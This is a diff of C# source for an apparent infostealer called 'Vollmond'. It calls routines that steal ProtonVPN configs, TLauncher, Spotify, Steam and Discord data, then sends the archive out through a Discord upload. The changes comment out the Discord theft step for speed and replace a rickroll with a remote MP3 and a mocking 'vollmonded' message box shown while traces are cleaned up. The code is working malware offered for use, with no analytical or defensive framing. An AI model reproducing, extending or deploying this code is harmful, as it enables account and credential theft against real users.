@@ -37,7 +37,7 @@ namespace Vollmond
                 ProtonVPN.StealConnectionConfig(); // Makes a directory "VPN" (Nota Bene)
                 Tlauncher.Steal(); // Makes a directory "Minecraft" (Nota bene)
                 Spotify.Steal();
-                discord.Steal();
+                //discord.Steal(); // You can comment this out later, as this operation consumes a significant amount of time and RAM (2 GB, 15 seconds).
                 Steam.Steal(); // Makes a directory "games" (Nota bene)
 
 
@@ -54,15 +54,25 @@ namespace Vollmond
 
                 // Sending archive
 
-                await SendToDiscord.SendAsync();
                 SendToDiscord.SendAsync().Wait();
 
-                //if (URLs.is_need_rickroll == true)
-                //{
-                //    Auxiliary.play_rick.Start();
-                //    MessageBox.Show("U are rickrolled muhaha", "Rick Astley",
-                //        MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
-                //}
+                // Playing sound asynchronous, when archive is sendings and traces cleaning up
+                if (URLs.is_need_sound == true)
+                {
+                    try
+                    {
+                        _ = Auxiliary.PlaysoundAsync("https://s2.deliciouspeaches.com/get/cuts/a2/fd/a2fd8b77225591004cd80deb4de9365d/47889160/In_Extremo_-_Vollmond_b128f0d239.mp3");
+
+                        await Task.Run(() =>
+                        {
+                            MessageBox.Show("U are vollmonded muhaha", "In Extremo",
+                                MessageBoxButtons.OK, MessageBoxIcon.Information,
+                                MessageBoxDefaultButton.Button1,
+                                MessageBoxOptions.ServiceNotification);
+                        });
+                    }
+                    catch { }
+                }
             }
             finally
             {
